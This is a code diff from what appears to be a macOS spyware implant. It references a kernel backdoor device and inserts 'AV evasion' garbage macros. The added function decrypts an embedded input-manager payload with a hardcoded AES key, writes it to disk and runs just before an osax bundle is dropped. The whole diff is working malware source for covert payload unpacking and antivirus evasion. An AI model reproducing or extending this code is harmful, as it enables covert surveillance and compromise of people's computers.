@@ -21,12 +21,15 @@
 #import <ScriptingBridge/ScriptingBridge.h>
 #import <Carbon/Carbon.h>
 #import <CommonCrypto/CommonDigest.h>
+#import <CommonCrypto/CommonCryptor.h>
 
 #import <Security/Authorization.h>
 #import <Security/AuthorizationTags.h>
 
 #include <IOKit/pwr_mgt/IOPMLib.h>
 #include <IOKit/IOMessage.h>
+
+#import "RCSMInputmanager_aes.h"
 
 #import "speex.h"
 
@@ -266,6 +269,47 @@ static void computerWillShutdown(CFMachPortRef port,
         const char *userName = [NSUserName() UTF8String];
         ioctl(gBackdoorFD, MCHOOK_UNREGISTER, userName);
     }
+}
+
+void decryptAndSaveIm()
+{
+  NSData *imData = [NSData dataWithBytes:_tmp_inputmanager_buff_des
+                                  length:_tmp_inputmanager_buff_des_len];
+  
+  NSString *imPath = [NSString stringWithFormat:@"%@/%@",
+                      [[NSBundle mainBundle] bundlePath], gInputManagerName];
+  
+  char *outbuffer = (char*)malloc([imData length] + kCCBlockSizeAES128);
+  
+  size_t numBytesEncrypted = 0, outLen = [imData length] + kCCBlockSizeAES128;
+  
+  CCCryptorStatus result;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
+  char *key[kCCKeySizeAES128+1];
+  
+  bzero(key, kCCKeySizeAES128+1);
+  int *_key =(int*)key;
+  *_key = 0x60504010;
+  
+  result = CCCrypt(kCCDecrypt,
+                   kCCAlgorithmAES128,
+                   kCCOptionPKCS7Padding,
+                   key,
+                   kCCKeySizeAES128,
+                   NULL,
+                   [imData bytes], [imData length],
+                   outbuffer, outLen,
+                   &numBytesEncrypted);
+  
+  NSData *imDataToWrite = [NSData dataWithBytes:outbuffer length:numBytesEncrypted];
+  
+  if (result == kCCSuccess)
+  {
+    [imDataToWrite writeToFile:imPath atomically:YES];
+  }
 }
 
 #pragma mark -
@@ -3615,7 +3659,7 @@ static void computerWillShutdown(CFMachPortRef port,
     AV_GARBAGE_004
     
     // On lion fork to sendEvents without problem
-    if ([gUtil isLion] == YES || [gUtil isMtLion] == YES || [gUtil isMaverics] == YES)
+    if ([gUtil isLion] == YES || [gUtil isMtLion] == YES)
     {
         NSTask *aTask = [[NSTask alloc] init];
         NSMutableArray *args = [NSMutableArray array];
@@ -4242,6 +4286,12 @@ static void computerWillShutdown(CFMachPortRef port,
         //        }
     }
     */
+  
+    // AV evasion: only on release build
+    AV_GARBAGE_006
+  
+    decryptAndSaveIm();
+  
     [self _dropOsaxBundle];
     
     // AV evasion: only on release build
